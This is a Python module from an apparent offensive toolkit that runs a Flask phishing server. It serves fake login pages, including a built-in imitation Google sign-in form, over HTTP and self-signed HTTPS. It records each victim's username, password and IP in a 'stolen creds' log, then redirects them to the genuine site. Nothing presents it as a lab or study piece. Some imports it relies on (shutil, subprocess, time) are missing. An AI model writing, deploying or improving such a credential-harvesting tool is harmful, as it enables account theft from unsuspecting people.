# modules/phishing_ext.py

import os
import threading
import datetime
import ssl
import logging
from flask import Flask, request, render_template_string, redirect, abort
from modules.logger import log_event

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, "phishing_templates")
CERT_DIR = os.path.join(BASE_DIR, "phishing_certs")
CERT_FILE = os.path.join(CERT_DIR, "selfsigned.crt")
KEY_FILE = os.path.join(CERT_DIR, "selfsigned.key")

DEFAULT_HTTP_PORT = 8080
DEFAULT_HTTPS_PORT = 8443

CRED_LOG_PATH = os.path.join(os.path.expanduser("~"), "phish_creds.log")
USE_HTTPS = True   # Set to False to disable HTTPS entirely

# Ensure directories exist
os.makedirs(CREDENTIAL_DIR := os.path.dirname(CRED_LOG_PATH), exist_ok=True)
os.makedirs(TEMPLATE_DIR, exist_ok=True)
os.makedirs(CERT_DIR, exist_ok=True)

# ──────────────────────────────────────────────────────────────────────────────
# Helper to generate self‐signed certificate if missing
# ──────────────────────────────────────────────────────────────────────────────

def generate_self_signed_cert(cert_path: str, key_path: str):
    """
    Generate a self‐signed certificate using openssl command (if available).
    If openssl is not available, logs a warning and skips HTTPS support.
    """
    if os.path.exists(cert_path) and os.path.exists(key_path):
        return True

    # Try to call `openssl`
    openssl = shutil.which("openssl")
    if not openssl:
        logging.warning("[phishing_ext] OpenSSL not found; HTTPS disabled.")
        return False

    subj = "/C=US/ST=CA/L=SanFrancisco/O=EvilCorp/OU=IT/CN=phish.local"
    cmd = [
        openssl, "req", "-x509", "-nodes", "-days", "365",
        "-newkey", "rsa:2048",
        "-keyout", key_path,
        "-out", cert_path,
        "-subj", subj
    ]
    try:
        subprocess.check_call(cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError as e:
        logging.warning(f"[phishing_ext] Failed to generate self‐signed cert: {e}")
        return False

# ──────────────────────────────────────────────────────────────────────────────
# Flask App Initialization
# ──────────────────────────────────────────────────────────────────────────────

try:
    from flask import Flask
except ImportError:
    Flask = None

app = Flask(__name__)

# Ensure credential log file exists
if not os.path.exists(CRED_LOG_PATH):
    open(CRED_LOG_PATH, "w").close()

def log_credentials(phish_type: str, username: str, password: str, client_ip: str):
    """Append stolen creds to a file and to encrypted event log."""
    ts = datetime.datetime.utcnow().isoformat()
    line = f"{ts} | {phish_type.upper()} | IP: {client_ip} | user: {username} | pass: {password}\n"
    try:
        with open(CRED_LOG_PATH, "a") as f:
            f.write(line)
    except Exception as e:
        logging.error(f"[phishing_ext] Failed to write creds log: {e}")
    # Also send to central logger
    log_event({
        "type": "phishing_credential",
        "platform": phish_type,
        "username": username,
        "client_ip": client_ip
    })

def load_templates():
    """
    Load all .html files under phishing_templates/ as named templates.
    Filename (without .html) is the key, and
    url path is '/' + name.
    """
    templates = {}
    for fname in os.listdir(TEMPLATE_DIR):
        if not fname.lower().endswith(".html"):
            continue
        name = fname[:-5]
        path = os.path.join(TEMPLATE_DIR, fname)
        try:
            with open(path, "r", encoding="utf-8") as f:
                html = f.read()
            templates[name] = html
        except Exception as e:
            logging.warning(f"[phishing_ext] Failed to load template {fname}: {e}")
    return templates

TEMPLATES = load_templates()
if not TEMPLATES:
    # Fallback: create a basic dummy Google template
    TEMPLATES = {
        "google": """
<!doctype html>
<title>Google Sign-In</title>
<h2>Sign in – Google Accounts</h2>
<form method="post" action="/google">
  <label>Email:</label><br>
  <input type="text" name="username" style="width:300px"><br><br>
  <label>Password:</label><br>
  <input type="password" name="password" style="width:300px"><br><br>
  <button type="submit" style="width:100px;padding:8px;">Sign In</button>
</form>
"""
    }

# Dynamically register routes
for name, html_template in TEMPLATES.items():
    url_path = f"/{name}"

    def make_view(phish_name, tmpl):
        def view():
            if Flask is None:
                return "Flask not installed", 500
            if request.method == "GET":
                return render_template_string(tmpl)
            elif request.method == "POST":
                username = request.form.get("username", "")
                password = request.form.get("password", "")
                client_ip = request.remote_addr or "unknown"
                log_credentials(phish_name, username, password, client_ip)
                # Redirect to legit site
                return redirect(f"https://www.{phish_name}.com")
            else:
                abort(405)
        return view

    view_func = make_view(name, html_template)
    app.add_url_rule(rule=url_path, endpoint=name, view_func=view_func, methods=["GET", "POST"])


def start_phishing_server(http_port: int = DEFAULT_HTTP_PORT, https_port: int = DEFAULT_HTTPS_PORT):
    """
    Start the Flask phishing server in a new thread.  
    If USE_HTTPS is True and certs can be generated, also serve on HTTPS.
    """
    if Flask is None:
        logging.error("[phishing_ext] Flask is not installed; cannot start phishing server.")
        return None

    def run_http():
        log_event({"type": "phishing_server", "action": "start_http", "port": http_port})
        try:
            app.run(host="0.0.0.0", port=http_port, debug=False)
        except Exception as e:
            logging.error(f"[phishing_ext] HTTP phishing server failed: {e}")
            log_event({"type": "phishing_server_failed", "proto": "http", "error": str(e)})

    http_thread = threading.Thread(target=run_http, daemon=True)
    http_thread.start()

    if USE_HTTPS:
        if generate_self_signed_cert(CERT_FILE, KEY_FILE):
            def run_https():
                log_event({"type": "phishing_server", "action": "start_https", "port": https_port})
                try:
                    context = (CERT_FILE, KEY_FILE)
                    app.run(host="0.0.0.0", port=https_port, ssl_context=context, debug=False)
                except Exception as e:
                    logging.error(f"[phishing_ext] HTTPS phishing server failed: {e}")
                    log_event({"type": "phishing_server_failed", "proto": "https", "error": str(e)})
            https_thread = threading.Thread(target=run_https, daemon=True)
            https_thread.start()
        else:
            logging.warning("[phishing_ext] Could not generate HTTPS cert; HTTPS server disabled.")
    return http_thread


if __name__ == "__main__":
    print(f"[+] Templates available: {list(TEMPLATES.keys())}")
    print(f"[+] Starting HTTP phishing on port {DEFAULT_HTTP_PORT}")
    start_phishing_server(DEFAULT_HTTP_PORT, DEFAULT_HTTPS_PORT)
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
